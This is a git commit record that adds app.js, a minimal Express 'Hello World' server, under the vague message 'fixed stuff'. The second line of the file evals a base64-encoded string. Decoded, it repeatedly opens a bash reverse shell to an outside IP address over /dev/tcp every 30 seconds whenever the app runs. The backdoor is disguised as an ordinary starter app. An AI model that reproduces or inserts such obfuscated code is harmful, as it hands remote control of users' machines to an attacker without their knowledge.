b47111b1cea6a5d85057007d8f24cdd2ef45b8a8
Le-Yo <le-yo@le-yo.com>
2017-05-12 21:58:24 +0300

    fixed stuff

---
+++ app.js
@@ -0,0 +1,11 @@
+var express = require('express');
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+var app = express();
+
+app.get('/',function(req,res){
+    res.send('Hello World');
+});
+
+app.listen(3000,function(){
+    console.log('Example app listening on port 3000');
+})
